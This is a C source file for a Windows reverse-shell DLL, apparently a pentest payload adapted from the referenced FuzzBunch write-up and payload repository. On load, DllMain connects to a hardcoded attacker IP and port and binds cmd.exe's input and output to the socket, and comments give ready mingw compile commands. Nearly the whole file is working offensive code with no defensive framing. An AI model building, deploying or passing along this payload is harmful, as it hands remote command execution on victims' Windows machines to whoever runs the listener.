// x64 compile: x86_64-w64-mingw32-gcc dll.c -o output.dll -shared -lws2_32
// x32 compile: i686-w64-mingw32-gcc dll.c -o output.dll -shared -lws2_32

#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>

#pragma comment(lib, "ws2_32.lib")

char server_ip[] = "10.6.102.162"; // Your Machine's IP
int server_port = 5555;        // Listening Port
    
int revshell() {

    WSADATA wsaData;
    SOCKET sock;
    struct sockaddr_in server;
    STARTUPINFO start_info;
    PROCESS_INFORMATION proc_info;

    WSAStartup(MAKEWORD(2, 2), &wsaData); // Initialize Win Socket
    sock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0); // Create Socket

    server.sin_family = AF_INET; // IPV4 address family
    server.sin_addr.s_addr = inet_addr(server_ip); // Server IP to connect
    server.sin_port = htons(server_port); // Server Port to connect

    WSAConnect(sock, (SOCKADDR*)&server, sizeof(server), NULL, NULL, NULL, NULL);

    memset(&start_info, 0, sizeof(start_info)); // I/O handler
    start_info.cb = sizeof(start_info);
    start_info.dwFlags = STARTF_USESTDHANDLES;
    start_info.hStdInput = start_info.hStdOutput = start_info.hStdError = (HANDLE)sock;

    CreateProcessA(NULL, "cmd", NULL, NULL, TRUE, 0, NULL, NULL, &start_info, &proc_info); // Create Process

    return 0;

}


BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {
    if (dwReason == DLL_PROCESS_ATTACH) {
        revshell();
        ExitProcess(0);
    }
    return TRUE;
}

/*
References:
- https://medium.com/@ahmadshamius2/exploring-fuzzbunch-and-writing-a-reverse-shell-dll-01d287da1fd7
- https://github.com/Hood3dRob1n/Y.A.S.P./blob/master/payloads/reverse-dll/reverse_dll.c
 */